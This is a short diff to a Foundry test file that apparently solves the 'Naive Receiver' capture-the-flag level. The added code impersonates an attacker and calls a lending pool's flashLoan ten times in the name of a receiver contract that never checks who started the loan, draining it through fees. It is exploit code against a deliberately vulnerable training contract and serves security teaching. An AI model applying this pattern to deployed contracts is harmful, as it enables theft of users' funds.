@@ -50,6 +50,17 @@ contract NaiveReceiver is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // fallback in flashLoanReceiver fails to check origin of flashloan
+
+        vm.startPrank(attacker);
+        for (uint8 i = 0; i < 10; ) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+            unchecked {
+                ++i;
+            }
+        }
+        vm.stopPrank();
+
         /** EXPLOIT END **/
         validation();
     }
